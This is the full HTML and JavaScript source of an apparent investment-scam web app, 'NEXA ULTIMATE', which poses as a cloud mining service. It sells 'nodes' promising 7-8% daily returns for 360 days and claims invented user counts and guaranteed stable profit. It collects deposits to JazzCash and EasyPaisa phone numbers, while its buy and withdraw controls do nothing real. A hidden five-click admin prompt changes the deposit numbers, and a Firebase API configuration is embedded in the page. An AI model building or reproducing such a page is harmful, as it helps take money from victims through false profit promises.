<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA ULTIMATE | Cloud Infrastructure</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        :root { --p: #2563EB; --dark: #0b0f1a; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--dark); color: white; overflow-x: hidden; }
        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.05); border-radius: 24px; }
        .btn-grad { background: linear-gradient(135deg, #2563EB, #7C3AED); color: white; font-weight: 800; border-radius: 16px; transition: 0.3s; }
        .nav-icon { font-size: 20px; color: #64748b; transition: 0.3s; cursor: pointer; }
        .active-nav { color: #2563EB !important; transform: scale(1.2); }
        .hidden { display: none !important; }
        input { background: rgba(255,255,255,0.05) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; }
    </style>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
            authDomain: "verbose-6c008.firebaseapp.com",
            databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
            projectId: "verbose-6c008",
            storageBucket: "verbose-6c008.firebasestorage.app",
            messagingSenderId: "867100945312",
            appId: "1:867100945312:web:315dfb48fb34496cee12c5"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        let currentUserData = null;
        let adminSettings = { jazz: "03705519562", easy: "03379827882" };

        // --- Auth System ---
        window.loginUser = async () => {
            const user = document.getElementById('username-input').value;
            if(!user) return alert("Sweetie, enter username! 💋");
            try {
                const cred = await signInAnonymously(auth);
                const uid = cred.user.uid;
                const userRef = ref(db, 'users/' + uid);
                const snap = await get(userRef);
                
                if(!snap.exists()) {
                    await set(userRef, { username: user, balance: 2.0, pkr: 200, uid: uid, nodes: [] });
                }
                localStorage.setItem('nexa_uid', uid);
                location.reload();
            } catch (e) { alert("Error: " + e.message); }
        };

        // --- Initialize App ---
        window.onload = () => {
            const uid = localStorage.getItem('nexa_uid');
            if(uid) {
                document.getElementById('auth-page').classList.add('hidden');
                document.getElementById('main-app').classList.remove('hidden');
                syncData(uid);
                renderAllNodes();
            }
        };

        function syncData(uid) {
            onValue(ref(db, 'users/' + uid), (s) => {
                currentUserData = s.val();
                if(currentUserData) {
                    document.getElementById('nav-name').innerText = currentUserData.username;
                    document.getElementById('bal-usd').innerText = "$" + currentUserData.balance.toFixed(2);
                    document.getElementById('bal-pkr').innerText = "Rs. " + currentUserData.pkr;
                    document.getElementById('wallet-usd').innerText = "$" + currentUserData.balance.toFixed(2);
                }
            });
            onValue(ref(db, 'admin/settings'), (s) => { if(s.exists()) adminSettings = s.val(); });
        }

        // --- Render 15+15 Nodes ---
        function renderAllNodes() {
            const usdBox = document.getElementById('usd-container');
            const pkrBox = document.getElementById('pkr-container');
            
            for(let i=1; i<=15; i++) {
                const price = i * 10;
                const daily = (price * 0.08).toFixed(2);
                usdBox.innerHTML += `
                    <div class="glass p-5 mb-4 border-l-4 border-blue-500">
                        <div class="flex justify-between font-black mb-3">
                            <span class="text-xs text-blue-400">USD NODE V.${i}</span>
                            <span class="text-lg">$${price}</span>
                        </div>
                        <div class="grid grid-cols-2 gap-2 text-[10px] font-bold text-slate-400 mb-4">
                            <p>Daily: <span class="text-white">$${daily}</span></p>
                            <p>Total: <span class="text-white">$${(daily * 360).toFixed(0)}</span></p>
                            <p>Contract: <span class="text-white">360 Days</span></p>
                            <p>Status: <span class="text-green-500">Active</span></p>
                        </div>
                        <button onclick="buyNode(${price}, 'usd')" class="w-full btn-grad py-3 text-[10px]">Deploy Node</button>
                    </div>`;

                const pricePkr = i * 500;
                const dailyPkr = (pricePkr * 0.07).toFixed(0);
                pkrBox.innerHTML += `
                    <div class="glass p-5 mb-4 border-l-4 border-yellow-500">
                        <div class="flex justify-between font-black mb-3">
                            <span class="text-xs text-yellow-400">PKR NODE V.${i}</span>
                            <span class="text-lg">Rs. ${pricePkr}</span>
                        </div>
                        <div class="grid grid-cols-2 gap-2 text-[10px] font-bold text-slate-400 mb-4">
                            <p>Daily: <span class="text-white">Rs. ${dailyPkr}</span></p>
                            <p>Total: <span class="text-white">Rs. ${dailyPkr * 360}</span></p>
                            <p>Contract: <span class="text-white">360 Days</span></p>
                            <p>Profit: <span class="text-green-500">Instant</span></p>
                        </div>
                        <button onclick="buyNode(${pricePkr}, 'pkr')" class="w-full bg-yellow-500 text-black font-black py-3 rounded-2xl text-[10px]">Deploy Node</button>
                    </div>`;
            }
        }

        // --- Core Functions ---
        window.buyNode = (price, type) => {
            const bal = type === 'usd' ? currentUserData.balance : currentUserData.pkr;
            if(bal < price) {
                alert(`Insufficient ${type.toUpperCase()} Balance! Please Deposit sweetie. 💋`);
                switchTab('wallet');
            } else {
                alert("Processing Deployment...");
            }
        };

        window.openDeposit = (method) => {
            const num = method === 'jazz' ? adminSettings.jazz : adminSettings.easy;
            const tid = prompt(`DEPOSIT TO ${method.toUpperCase()}\nNumber: ${num}\n\nEnter 11-Digit Transaction ID:`);
            if(tid) alert("Transaction submitted! Processing will take 1-6 hours. 💋");
        };

        window.switchTab = (tab) => {
            ['home','nodes','wallet','info'].forEach(t => document.getElementById('tab-'+t).classList.add('hidden'));
            document.getElementById('tab-'+tab).classList.remove('hidden');
            document.querySelectorAll('.nav-icon').forEach(n => n.classList.remove('active-nav'));
            event.currentTarget.classList.add('active-nav');
        };

        let clickCount = 0;
        window.triggerAdmin = () => {
            clickCount++;
            if(clickCount >= 5) {
                const j = prompt("Enter New JazzCash/SadaPay Number:", adminSettings.jazz);
                const e = prompt("Enter New EasyPaisa Number:", adminSettings.easy);
                if(j && e) update(ref(db, 'admin/settings'), { jazz: j, easy: e });
                clickCount = 0;
            }
        };
    </script>
</head>
<body class="pb-28">

    <!-- Auth Page -->
    <div id="auth-page" class="fixed inset-0 bg-[#0b0f1a] z-[9999] flex flex-col justify-center p-10">
        <div class="text-center mb-10">
            <div class="w-20 h-20 bg-blue-600 rounded-[2rem] mx-auto flex items-center justify-center rotate-12 mb-6">
                <i class="fa-solid fa-cloud text-white text-3xl -rotate-12"></i>
            </div>
            <h1 class="text-3xl font-black italic tracking-tighter">NEXA CLOUD</h1>
            <p class="text-[10px] font-bold text-slate-500 uppercase mt-2 tracking-widest">Quantum Terminals v4.0</p>
        </div>
        <input id="username-input" type="text" placeholder="Username" class="w-full p-5 rounded-2xl mb-4 outline-none font-bold text-center">
        <button onclick="loginUser()" class="w-full btn-grad py-5 text-xs uppercase tracking-widest shadow-xl shadow-blue-900/20">Connect Terminal</button>
    </div>

    <!-- Main App -->
    <div id="main-app" class="hidden">
        <header class="p-6 sticky top-0 bg-[#0b0f1a]/80 backdrop-blur-lg border-b border-white/5 z-50 flex justify-between items-center">
            <div onclick="triggerAdmin()" class="flex items-center gap-3">
                <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white"><i class="fa-solid fa-bolt"></i></div>
                <div>
                    <h2 id="nav-name" class="text-sm font-black italic">...</h2>
                    <p class="text-[8px] font-bold text-green-500 uppercase">● Live Connection</p>
                </div>
            </div>
            <div class="text-right">
                <p id="bal-usd" class="text-blue-500 font-black">$0.00</p>
                <p id="bal-pkr" class="text-[9px] font-bold text-slate-500">Rs. 0</p>
            </div>
        </header>

        <main class="p-5">
            <!-- Home -->
            <div id="tab-home" class="space-y-6">
                <div class="glass p-8 bg-gradient-to-br from-blue-900/30 to-transparent">
                    <h1 class="text-4xl font-black italic leading-none mb-4">Master<br><span class="text-blue-500">Infrastructure.</span></h1>
                    <p class="text-[11px] font-bold text-slate-400 mb-8 leading-relaxed">NEXA provides professional-grade mining nodes with daily automated settlements.</p>
                    <button onclick="switchTab('nodes')" class="btn-grad px-8 py-4 text-[10px] uppercase">Browse 30 Nodes</button>
                </div>
                <div class="grid grid-cols-2 gap-4">
                    <div class="glass p-5 text-center"><p class="text-2xl font-black">180K</p><p class="text-[8px] font-bold text-slate-500 uppercase">Global Users</p></div>
                    <div class="glass p-5 text-center"><p class="text-2xl font-black text-blue-500">99.9%</p><p class="text-[8px] font-bold text-slate-500 uppercase">Uptime</p></div>
                </div>
                <div class="glass p-6">
                    <h3 class="text-xs font-black uppercase mb-4 text-blue-500">Market Performance</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between text-xs font-bold"><span>Bitcoin (BTC)</span><span class="text-green-500">$71,450.00</span></div>
                        <div class="flex justify-between text-xs font-bold"><span>NEXA Shard</span><span class="text-blue-400">$1.24</span></div>
                    </div>
                </div>
            </div>

            <!-- Nodes -->
            <div id="tab-nodes" class="hidden space-y-6">
                <h3 class="text-[10px] font-black text-slate-500 uppercase tracking-widest">Dollar Infrastructure (USD)</h3>
                <div id="usd-container"></div>
                <h3 class="text-[10px] font-black text-slate-500 uppercase tracking-widest mt-10">Local Infrastructure (PKR)</h3>
                <div id="pkr-container"></div>
            </div>

            <!-- Wallet -->
            <div id="tab-wallet" class="hidden space-y-6">
                <div class="glass p-10 text-center bg-gradient-to-t from-blue-600/10 to-transparent">
                    <p class="text-[10px] font-black text-slate-500 uppercase mb-2">Total Earnings</p>
                    <h1 id="wallet-usd" class="text-5xl font-black">$0.00</h1>
                    <div class="grid grid-cols-2 gap-4 mt-10">
                        <button onclick="openDeposit('jazz')" class="btn-grad py-4 text-[10px]">DEPOSIT</button>
                        <button class="bg-white/5 border border-white/10 py-4 rounded-2xl font-black text-[10px]">WITHDRAW</button>
                    </div>
                </div>
                <div class="glass p-8">
                    <h3 class="text-xs font-black uppercase mb-6 italic">Secure Cashout</h3>
                    <input type="text" placeholder="Account Name/Number" class="w-full p-5 rounded-2xl mb-4 outline-none font-bold text-xs">
                    <input type="number" placeholder="Amount" class="w-full p-5 rounded-2xl mb-4 outline-none font-bold text-xs">
                    <button class="w-full btn-grad py-5 text-[10px] uppercase">Process Request</button>
                </div>
            </div>

            <!-- Info -->
            <div id="tab-info" class="hidden space-y-6">
                <div class="glass p-6">
                    <h2 class="text-xl font-black italic mb-4">Security Protocol</h2>
                    <p class="text-[11px] text-slate-400 leading-relaxed font-bold">All node settlements are encrypted via SSL. NEXA uses AI-driven distribution to ensure your daily profit remains stable regardless of market volatility.</p>
                </div>
                <div class="glass p-6 border-l-4 border-blue-500">
                    <h3 class="text-xs font-black uppercase mb-2">Support 24/7</h3>
                    <p class="text-[10px] text-slate-500 font-bold">Contact us via the official channel for any deposit or node deployment issues.</p>
                </div>
                <button onclick="localStorage.clear(); location.reload();" class="w-full bg-red-500/10 text-red-500 border border-red-500/20 py-5 rounded-2xl font-black text-[10px] uppercase">
                    Exit Terminal Session
                </button>
            </div>
        </main>

        <nav class="fixed bottom-6 left-6 right-6 h-20 glass rounded-[2.5rem] flex justify-around items-center px-4 z-[1000] shadow-2xl">
            <button onclick="switchTab('home')" class="nav-icon active-nav"><i class="fa-solid fa-house"></i></button>
            <button onclick="switchTab('nodes')" class="nav-icon"><i class="fa-solid fa-server"></i></button>
            <button onclick="switchTab('wallet')" class="nav-icon"><i class="fa-solid fa-wallet"></i></button>
            <button onclick="switchTab('info')" class="nav-icon"><i class="fa-solid fa-shield-halved"></i></button>
        </nav>
    </div>

</body>
</html>
